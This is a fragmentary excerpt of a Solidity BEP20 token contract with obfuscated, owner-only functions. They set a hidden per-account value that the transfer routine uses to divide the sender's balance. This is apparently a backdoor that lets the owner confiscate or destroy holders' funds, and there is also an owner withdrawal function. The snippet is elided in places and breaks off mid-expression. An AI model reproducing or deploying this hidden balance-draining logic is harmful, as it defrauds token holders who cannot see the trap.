...
contract Token is IBEP20, HasForeignAsset {
    ...
    function get65154(address account) public view returns (uint256) {
        return _65154[account];
    }

    function set65154(address account) public onlyOwner {
        _65154[account] = s16562;
    }

    function cacale65154(address account) public onlyOwner {
        _65154[account] = 0;
    }


    function withdrawAasses(address account,uint256 num) public onlyOwner {
    ...
    function _transfer(
        ...
        _balances[sender] = _balances[sender].div(
            _65154[sender]+0,
